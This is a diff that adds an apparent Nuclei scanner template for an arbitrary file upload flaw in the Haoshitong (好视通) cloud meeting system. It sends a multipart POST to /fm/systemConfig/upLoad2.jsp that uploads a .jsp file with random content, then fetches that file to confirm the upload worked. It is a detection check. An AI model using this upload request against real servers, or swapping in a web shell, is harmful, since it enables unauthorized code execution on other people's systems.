@@ -1,0 +1,40 @@
+id: haoshitong-upLoad2-upload
+
+info:
+  name: 好视通云会议upLoad2.jsp接口处存在任意文件上传漏洞
+  author: haoshitong
+  severity: high
+  tags: haoshitong
+
+http:
+  - raw:
+      - |
+        POST /fm/systemConfig/upLoad2.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
+        Accept-Encoding: gzip
+
+        --1515df1sdfdsfddfs
+        Content-Disposition: form-data; name="file"; filename="3d6s2dpl.jsp"
+        Content-Type: application/octet-stream
+        
+        {{randstr_1}}
+        --1515df1sdfdsfddfs--
+
+      - |+
+        GET /fm/upload/3d6s2dpl.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
